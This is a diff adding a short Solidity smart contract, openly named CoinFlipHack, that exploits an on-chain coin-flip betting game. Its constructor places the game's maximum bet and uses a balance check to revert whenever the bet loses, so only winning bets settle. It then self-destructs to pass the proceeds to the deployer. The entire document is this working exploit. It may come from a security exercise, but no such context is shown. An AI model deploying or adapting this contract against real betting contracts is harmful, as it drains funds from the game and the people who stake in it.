@@ -1,0 +1,22 @@
+pragma solidity ^0.6.0;
+
+interface CoinFlipInterface {
+    function bet() external payable;
+    function maxBet() external view returns(uint256);
+}
+
+contract CoinFlipHack {
+    uint256 payday;
+    CoinFlipInterface haxx;
+    
+    constructor(address payable game) public payable{
+        haxx = CoinFlipInterface(game);
+        
+        payday = address(this).balance;
+        
+        haxx.bet.value(haxx.maxBet())();
+        require(address(this).balance > payday,"not enough money");
+        
+        selfdestruct(msg.sender);
+    }
+}
